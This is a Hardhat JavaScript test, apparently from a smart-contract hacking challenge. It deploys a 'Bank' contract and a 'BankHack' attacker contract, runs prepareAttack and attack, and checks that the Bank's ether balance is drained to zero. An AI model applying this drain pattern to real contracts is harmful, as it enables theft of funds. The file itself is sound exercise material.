const { expect } = require("chai");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

describe("Bank", function () {
  async function deployFixture() {
    const Bank = await ethers.deployContract("Bank", {
      value: ethers.parseEther("0.01"),
    });

    await Bank.waitForDeployment();

    console.log("Адрес контракта:", Bank.target);
    console.log("Адрес контракта:", await Bank.getAddress());

    const contractBalance = await ethers.provider.getBalance(Bank.target);
    console.log(
      "Баланс контракта:",
      ethers.formatEther(contractBalance),
      "ETH"
    );

    return { Bank };
  }

  it("hack", async function () {
    const { Bank } = await loadFixture(deployFixture);

    const [player] = await ethers.getSigners();

    provider = ethers.provider;

    initialBalance = await provider.getBalance(player.address);
    console.log("Initial balance:", initialBalance.toString());

    const BankHack = await ethers.deployContract("BankHack", [Bank]);

    await BankHack.waitForDeployment();

    await BankHack.prepareAttack({value: ethers.parseEther("0.01")});

    var contractBalance = await ethers.provider.getBalance(Bank.target);
    console.log(
      "Баланс контракта after preparation:",
      ethers.formatEther(contractBalance),
      "ETH"
    );

    await BankHack.attack({value: ethers.parseEther("0.01")});

    contractBalance = await ethers.provider.getBalance(Bank.target);
    console.log(
      "Баланс контракта after attack:",
      ethers.formatEther(contractBalance),
      "ETH"
    );


    finalBalance = await provider.getBalance(player.address);
    console.log("Final balance:",finalBalance.toString());

    win = finalBalance - initialBalance;

    if(win > 0){
      console.log("We are richer with ", win, " eth.");
    }

    // var test = await player.getBalance();

    // console.log("Test:", test);

    // баланс контракта Bank должен стать 0
    await Bank.setCompleted();
    expect(await Bank.completed()).to.equal(true);

    expect(await ethers.provider.getBalance(Bank.target)).to.equal(0);
  });
});
